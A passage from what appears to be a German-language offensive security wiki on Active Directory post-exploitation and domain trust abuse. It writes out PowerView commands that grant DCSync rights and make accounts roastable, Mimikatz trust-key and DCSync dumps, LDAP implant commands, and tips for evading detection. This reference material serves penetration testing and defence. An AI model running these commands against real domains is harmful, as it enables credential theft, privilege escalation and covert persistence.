Wenn **andere Benutzer** auf die **kompromittierte** Maschine **zugreifen**, ist es möglich, **Credentials aus dem Speicher zu sammeln** und sogar **Beacons in deren Prozesse zu injizieren**, um sie zu impersonifizieren.\
In der Regel greifen Benutzer per RDP auf das System zu, hier sind ein paar Angriffe auf Drittanbieter-RDP-Sitzungen:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** stellt ein System zur Verwaltung des **lokalen Administratorpassworts** auf domain-joined Computern bereit, sodass dieses **randomisiert**, einzigartig und häufig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert und der Zugriff wird über ACLs nur für autorisierte Benutzer gesteuert. Mit ausreichenden Berechtigungen zum Zugriff auf diese Passwörter wird das Pivoting zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Das **Sammeln von Zertifikaten** von der kompromittierten Maschine kann ein Weg sein, um innerhalb der Umgebung Privilegien zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Wenn **verwundbare Templates** konfiguriert sind, ist es möglich, diese zu missbrauchen, um Privilegien zu eskalieren:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sobald du **Domain Admin** oder noch besser **Enterprise Admin** Rechte erlangt hast, kannst du die **Domänen-Datenbank** auslesen: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Einige der zuvor diskutierten Techniken können für Persistenz genutzt werden.\
Zum Beispiel könntest du:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver Ticket**-Angriff erstellt ein **legitimes Ticket Granting Service (TGS) Ticket** für einen spezifischen Dienst, indem der **NTLM-Hash** (z. B. der **Hash des PC-Kontos**) verwendet wird. Diese Methode wird verwendet, um **Zugriff auf die Dienstrechte** zu erhalten.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ein **Golden Ticket**-Angriff bedeutet, dass ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active Directory (AD)-Umgebung erlangt. Dieses Konto ist speziell, da es zur Signierung aller **Ticket Granting Tickets (TGTs)** verwendet wird, welche für die Authentifizierung innerhalb des AD-Netzwerks essentiell sind.

Sobald der Angreifer diesen Hash besitzt, kann er **TGTs** für beliebige Konten erstellen (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese sind ähnlich wie Golden Tickets, aber so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Das Besitzen von Zertifikaten eines Kontos oder die Möglichkeit, diese anzufordern**, ist ein sehr guter Weg, um in einem Benutzerkonto persistent zu bleiben (selbst wenn dieser das Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Mit Zertifikaten ist es ebenfalls möglich, mit hohen Rechten innerhalb der Domain persistente Zugänge zu etablieren:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory stellt die Sicherheit **privilegierter Gruppen** (wie Domain Admins und Enterprise Admins) sicher, indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um unautorisierte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden; wenn ein Angreifer die ACL des AdminSDHolder so ändert, dass ein regulärer Benutzer Vollzugriff erhält, gewinnt dieser Benutzer umfangreiche Kontrolle über alle privilegierten Gruppen. Diese Sicherheitsmaßnahme, die eigentlich schützen soll, kann somit nach hinten losgehen, wenn sie nicht eng überwacht wird.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In jedem **Domain Controller (DC)** existiert ein **lokales Administratorkonto**. Durch das Erlangen von Admin-Rechten auf einer solchen Maschine kann der lokale Administrator-Hash mittels **mimikatz** extrahiert werden. Anschließend ist eine Registry-Änderung erforderlich, um **die Verwendung dieses Passworts zu ermöglichen**, was den Remote-Zugriff auf das lokale Administrator-Konto erlaubt.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** bestimmte **Sonderrechte** an einigen Domänenobjekten geben, die es diesem Benutzer erlauben, **in Zukunft Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **Security Descriptors** werden verwendet, um die **Berechtigungen** zu **speichern**, die ein **Objekt** über ein **anderes Objekt** hat. Wenn du nur eine **kleine Änderung** im **Security Descriptor** eines Objekts vornehmen kannst, kannst du sehr interessante Rechte über dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Speicher, um ein **universelles Passwort** zu etablieren, das Zugriff auf alle Domänenkonten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst dein **eigenes SSP** erstellen, um die zur Anmeldung am Rechner verwendeten **Credentials im Klartext** zu **capturen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** im AD und nutzt ihn, um **Attribute** (SIDHistory, SPNs...) auf bestimmten Objekten zu **pushen**, **ohne** dabei Logs über die **Änderungen** zu hinterlassen. Du benötigst **DA**-Privilegien und musst in der **Root-Domain** sein.\
Beachte, dass bei falschen Daten recht unschöne Logs entstehen können.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vorher haben wir besprochen, wie man Privilegien eskalieren kann, wenn man **ausreichende Berechtigungen hat, LAPS-Passwörter zu lesen**. Diese Passwörter können jedoch auch verwendet werden, um **Persistenz** zu behalten.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als die Sicherheitsgrenze. Das bedeutet, dass **die Kompromittierung einer einzelnen Domain potenziell zur Kompromittierung des gesamten Forests führen kann**.

### Basic Information

Ein [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der einem Benutzer aus einer **Domain** ermöglicht, auf Ressourcen in einer anderen **Domain** zuzugreifen. Er stellt im Wesentlichen eine Verbindung zwischen den Authentifizierungssystemen der beiden Domains her, sodass Authentifizierungsanfragen nahtlos weitergeleitet werden können. Wenn Domains eine Vertrauensstellung konfigurieren, tauschen sie bestimmte **Keys** zwischen ihren **Domain Controllern (DCs)** aus und speichern diese, da sie für die Integrität der Vertrauensstellung wichtig sind.

In einem typischen Szenario muss ein Benutzer, der auf einen Dienst in einer **vertrauenden Domain** zugreifen möchte, zunächst ein spezielles Ticket, ein **inter-realm TGT**, von seinem eigenen Domain Controller anfordern. Dieses TGT ist mit einem geteilten **Key** verschlüsselt, den beide Domains vereinbart haben. Der Benutzer präsentiert dann dieses TGT dem **DC der vertrauenden Domain**, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Überprüfung des inter-realm TGT durch den DC der vertrauenden Domain stellt dieser ein TGS aus, das dem Benutzer den Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Client-Computer** in **Domain 1** startet den Prozess, indem er seinen **NTLM-Hash** verwendet, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, falls der Client erfolgreich authentifiziert wurde.
3. Der Client fordert dann ein **inter-realm TGT** von DC1 an, das benötigt wird, um auf Ressourcen in **Domain 2** zuzugreifen.
4. Das inter-realm TGT wird mit einem **Trust-Key** verschlüsselt, der zwischen DC1 und DC2 als Teil der beidseitigen Domain-Trusts geteilt wird.
5. Der Client bringt das inter-realm TGT zum **Domain Controller (DC2)** von Domain 2.
6. DC2 prüft das inter-realm TGT mit seinem geteilten Trust-Key und stellt, wenn gültig, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich präsentiert der Client dieses TGS dem Server, welches mit dem Account-Hash des Servers verschlüsselt ist, um Zugang zum Dienst in Domain 2 zu erhalten.

### Different trusts

Es ist wichtig zu beachten, dass **eine Vertrauensstellung einseitig oder zweiseitig** sein kann. Bei einer zweiseitigen Option vertrauen sich beide Domains gegenseitig, aber bei einer **einseitigen** Vertrauensbeziehung wird eine der Domains die **vertrauende** und die andere die **vertrauende Domain** sein. Im letzteren Fall **kannst du nur von der vertrauenden Domain aus auf Ressourcen in der vertrauenden Domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting domain und B die trusted domain. Außerdem wäre dies in **Domain A** eine **Outbound trust**; und in **Domain B** eine **Inbound trust**.

**Unterschiedliche Vertrauensbeziehungen**

- **Parent-Child Trusts**: Dies ist eine übliche Konfiguration innerhalb desselben Forests, bei der eine Child-Domain automatisch eine zweiseitige transitive Vertrauensstellung mit ihrer Parent-Domain hat. Im Grunde bedeutet das, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child fließen können.
- **Cross-link Trusts**: Auch als "shortcut trusts" bezeichnet, werden diese zwischen Child-Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals typischerweise bis zur Forest-Root und dann wieder hinunter zur Ziel-Domain reisen. Durch das Erstellen von Cross-Links wird dieser Weg verkürzt, was besonders in geografisch verteilten Umgebungen von Vorteil ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht miteinander verbundenen Domains eingerichtet und sind nicht-transitiv. Laut [Microsofts Dokumentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forests zuzugreifen, die nicht durch einen Forest-Trust verbunden ist. Die Sicherheit wird durch SID-Filtering bei External Trusts verstärkt.
- **Tree-root Trusts**: Diese Vertrauensstellungen werden automatisch zwischen der Forest-Root-Domain und einer neu hinzugefügten Tree-Root erstellt. Obwohl sie nicht häufig vorkommen, sind Tree-Root Trusts wichtig, um neue Domain-Trees zu einem Forest hinzuzufügen, ihnen einen eindeutigen Domain-Namen zu erlauben und die zweiseitige Transitivität sicherzustellen. Mehr Informationen dazu finden sich in [Microsofts Guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist eine zweiseitige transitive Vertrauensstellung zwischen zwei Forest-Root-Domains und erzwingt ebenfalls SID-Filtering, um die Sicherheitsmaßnahmen zu verstärken.
- **MIT Trusts**: Diese Vertrauensstellungen werden mit Nicht-Windows-, [RFC4120-kompatiblen](https://tools.ietf.org/html/rfc4120) Kerberos-Domains eingerichtet. MIT Trusts sind etwas spezialisierter und dienen Umgebungen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Other differences in **trusting relationships**

- Eine Vertrauensbeziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, dann vertraut A C) oder **nicht-transitiv**.
- Eine Vertrauensbeziehung kann als **bidirektional** (beide vertrauen einander) oder als **einseitig** (nur eine vertraut der anderen) konfiguriert werden.

### Attack Path

1. **Enumeriere** die Vertrauensbeziehungen
2. Prüfe, ob irgendein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domain** hat, möglicherweise durch ACE-Einträge oder durch Mitgliedschaft in Gruppen der anderen Domain. Suche nach **Beziehungen über Domains hinweg** (wahrscheinlich wurde der Trust genau dafür eingerichtet).
1. kerberoast könnte in diesem Fall eine weitere Option sein.
3. **Kompromittiere** die **Accounts**, die **durch Domains pivoten** können.

Angreifer können über drei primäre Mechanismen Zugriff auf Ressourcen in einer anderen Domain erhalten:

- **Local Group Membership**: Principals können lokalen Gruppen auf Maschinen hinzugefügt werden, z. B. der „Administrators“-Gruppe auf einem Server, was ihnen bedeutende Kontrolle über diese Maschine gewährt.
- **Foreign Domain Group Membership**: Principals können auch Mitglieder von Gruppen innerhalb der fremden Domain sein. Die Effektivität dieser Methode hängt jedoch von der Art des Trusts und dem Geltungsbereich der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** aufgeführt sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, die ihnen Zugriff auf spezifische Ressourcen gewährt. Für tiefergehende Einblicke in die Mechanik von ACLs, DACLs und ACEs ist das Whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” eine wertvolle Ressource.

### Find external users/groups with permissions

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** prüfen, um Foreign Security Principals in der Domain zu finden. Das sind Benutzer/Gruppen aus **einer externen Domain/Forest**.

Du kannst das in **Bloodhound** oder mit **powerview** prüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Weitere Möglichkeiten, Domain-Trusts zu enumerieren:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 trusted keys**, einen für _Child --> Parent_ und einen weiteren für _Parent_ --> _Child_.\
> Sie können den von der aktuellen Domain verwendeten Schlüssel mit folgendem Befehl ermitteln:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise admin in die child/parent domain eskalieren, indem man den Trust mit SID-History injection ausnutzt:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zu verstehen, wie der Configuration Naming Context (NC) ausgenutzt werden kann, ist entscheidend. Die Configuration NC dient als zentrales Repository für Konfigurationsdaten über einen Forest in Active Directory (AD)-Umgebungen. Diese Daten werden an jeden Domain Controller (DC) innerhalb des Forest repliziert; writable DCs halten eine beschreibbare Kopie der Configuration NC. Um dies auszunutzen, benötigt man **SYSTEM privileges on a DC**, vorzugsweise auf einem Child DC.

**Link GPO to root DC site**

Der Sites-Container der Configuration NC enthält Informationen über die Sites aller domain-gebundenen Computer innerhalb des AD-Forests. Mit SYSTEM-Rechten auf einem beliebigen DC können Angreifer GPOs mit den root DC Sites verknüpfen. Diese Aktion kann die Root-Domain gefährden, indem Richtlinien manipuliert werden, die auf diese Sites angewendet werden.

Für ausführliche Informationen kann man die Forschung zu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) heranziehen.

**Compromise any gMSA in the forest**

Ein Angriffsvektor zielt auf privilegierte gMSAs innerhalb der Domain ab. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs notwendig ist, wird in der Configuration NC gespeichert. Mit SYSTEM-Rechten auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter jeder gMSA im Forest zu berechnen.

Detaillierte Analysen und Schritt-für-Schritt-Anleitungen finden sich in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender delegated MSA-Angriff (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Forschung: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Diese Methode erfordert Geduld und das Warten auf die Erstellung neuer privilegierter AD-Objekte. Mit SYSTEM-Rechten kann ein Angreifer das AD Schema ändern, um jedem Benutzer vollständige Kontrolle über alle Klassen zu gewähren. Dies kann zu unautorisiertem Zugriff und Kontrolle über neu erstellte AD-Objekte führen.

Weiterführende Informationen finden sich unter [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-Schwachstelle zielt auf die Kontrolle über PKI-Objekte ab, um ein certificate template zu erstellen, das die Authentifizierung als beliebiger Benutzer innerhalb des Forest ermöglicht. Da PKI-Objekte in der Configuration NC liegen, erlaubt das Kompromittieren eines beschreibbaren Child DC die Durchführung von ESC5-Angriffen.

Mehr Details dazu finden sich in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In Szenarien ohne ADCS kann der Angreifer die notwendigen Komponenten selbst einrichten, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario wird **deine Domäne** von einer externen Domäne vertraut, wodurch dir **unbestimmte Berechtigungen** darauf gewährt werden. Du musst herausfinden, **welche Prinzipale deiner Domäne welchen Zugriff auf die externe Domäne haben**, und dann versuchen, diese auszunutzen:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domäne - Einweg (Ausgehend)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario vertraut **Ihre Domain** einigen **Privilegien** an einen Principal aus einer **anderen Domain**.

Allerdings, wenn eine **Domain von der vertrauenden Domain vertraut wird**, erstellt die vertrauenswürdige Domain **einen Benutzer** mit einem **vorhersagbaren Namen**, der als **Passwort das Trusted Password** verwendet. Das bedeutet, dass es möglich ist, **einen Benutzer aus der vertrauenden Domain zu nutzen, um in die vertrauenswürdige zu gelangen**, sie zu enumerieren und zu versuchen, weitere Privilegien zu eskalieren:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in der **gegengesetzten Richtung** der Domain-Trusts erstellt wurde (was nicht sehr häufig vorkommt).

Eine andere Methode, die vertrauenswürdige Domain zu kompromittieren, ist es, auf einer Maschine zu warten, auf die sich ein **Benutzer aus der vertrauenswürdigen Domain** per **RDP** einloggen kann. Der Angreifer könnte dann Code in den RDP-Session-Prozess injizieren und von dort **auf die Origin-Domain des Opfers zugreifen**.\
Wenn das **Opfer seine Festplatte gemountet hat**, könnte der Angreifer aus dem **RDP-Session**-Prozess **backdoors** im **Startup-Ordner der Festplatte** ablegen. Diese Technik wird **RDPInception** genannt.

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID-History-Attribut über Forest-Trusts ausnutzen, wird durch SID Filtering gemindert, das standardmäßig bei allen Inter-Forest-Trusts aktiviert ist. Dies basiert auf der Annahme, dass Intra-Forest-Trusts sicher sind — Microsoft betrachtet den Forest statt der Domain als Sicherheitsgrenze.
- Es gibt jedoch einen Haken: SID Filtering kann Anwendungen und Benutzerzugriffe stören, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Für Inter-Forest-Trusts sorgt Selective Authentication dafür, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domains und Server innerhalb der vertrauenden Domain oder des Forests zugreifen können.
- Es ist wichtig zu beachten, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-basierter AD-Missbrauch von On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-style LDAP-Primitiven als x64 Beacon Object Files neu, die vollständig innerhalb eines on-host implant (z. B. Adaptix C2) laufen. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann `ldap <subcommand>` vom Beacon aus auf. Der gesamte Traffic nutzt den aktuellen Logon-Sicherheitskontext über LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischem Certificate Trust, sodass keine socks-Proxies oder Disk-Artefakte erforderlich sind.

### Implant-seitige LDAP-Aufzählung

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` lösen kurze Namen/OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute`, und `get-domaininfo` ziehen beliebige Attribute (einschließlich security descriptors) sowie die Forest/Domain-Metadaten aus `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, und `get-rbcd` zeigen roasting-Kandidaten, Delegationseinstellungen und existierende [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-Deskriptoren direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` parsen die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/attribute writes) und Vererbung aufzulisten und liefern damit sofortige Ziele für ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP Schreib-Primitiven für Eskalation & Persistenz

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) erlauben dem Operator, neue Principals oder Maschinenkonten dort zu platzieren, wo OU-Rechte bestehen. `add-groupmember`, `set-password`, `add-attribute`, und `set-attribute` kapern Ziele direkt, sobald Write-Property-Rechte festgestellt werden.
- ACL-orientierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, und `add-dcsync` übersetzen WriteDACL/WriteOwner auf jedem AD-Objekt in Passwortresets, Kontrolle der Gruppenmitgliedschaft oder DCSync-Replikationsprivilegien, ohne PowerShell/ADSI-Artefakte zu hinterlassen. Die `remove-*` Gegenstücke räumen injizierte ACEs wieder weg.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Umschalter) markiert ihn für AS-REP roasting, ohne das Passwort zu berühren.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` vom Beacon um, ermöglichen constrained/unconstrained/RBCD-Angriffspfade und eliminieren die Notwendigkeit für remote PowerShell oder RSAT.

### sidHistory-Injektion, OU-Verschiebung und Gestaltung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (see [SID-History Injection](sid-history-injection.md)), und bietet so unauffällige Zugriffserbschaften vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/OU von Computern oder Nutzern, so dass ein Angreifer Assets in OUs verschieben kann, in denen bereits delegierte Rechte bestehen, bevor `set-password`, `add-groupmember` oder `add-spn` missbraucht werden.
- Eng begrenzte Entfernungskommandos (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) erlauben ein schnelles Rollback, nachdem der Operator Credentials oder Persistenz erfasst hat, und minimieren die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Allgemeine Verteidigungsmaßnahmen

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Es wird empfohlen, dass Domain Admins nur die Anmeldung an Domain Controllern erlaubt wird und ihre Nutzung auf anderen Hosts vermieden wird.
- **Service Account Privileges**: Dienste sollten nicht mit Domain Admin (DA)-Privilegien ausgeführt werden, um die Sicherheit zu gewährleisten.
- **Temporal Privilege Limitation**: Für Aufgaben, die DA-Privilegien erfordern, sollte deren Dauer begrenzt werden. Dies kann erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementierung von Täuschungstechniken**

- Die Implementierung von Täuschung umfasst das Stellen von Fallen, wie Decoy-Benutzer oder -Computer, mit Eigenschaften wie Passwörtern, die nicht ablaufen, oder die als Trusted for Delegation markiert sind. Ein detaillierter Ansatz beinhaltet das Erstellen von Benutzern mit spezifischen Rechten oder das Hinzufügen zu hoch privilegierten Gruppen.
- Ein praktisches Beispiel nutzt Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mehr zum Einsatz von Täuschungstechniken findet sich unter [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Täuschung identifizieren**

- **For User Objects**: Verdächtige Indikatoren umfassen atypische ObjectSID, seltene Logons, Erstellungsdaten und geringe Counts an schlechten Passworteingaben.
- **General Indicators**: Der Vergleich von Attributen potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können bei der Identifikation solcher Täuschungen helfen.

### **Umgehung von Detektionssystemen**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermeidung von Session-Enumeration auf Domain Controllern, um ATA-Detection zu verhindern.
- **Ticket Impersonation**: Die Nutzung von **aes**-Keys zur Erstellung von Tickets hilft, Erkennungen zu umgehen, da so kein Downgrade auf NTLM erfolgt.
- **DCSync Attacks**: Es wird empfohlen, von einem Nicht-Domain Controller aus auszuführen, um ATA-Erkennung zu vermeiden, da direkte Ausführung von einem Domain Controller Alarme auslöst.

## Referenzen

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
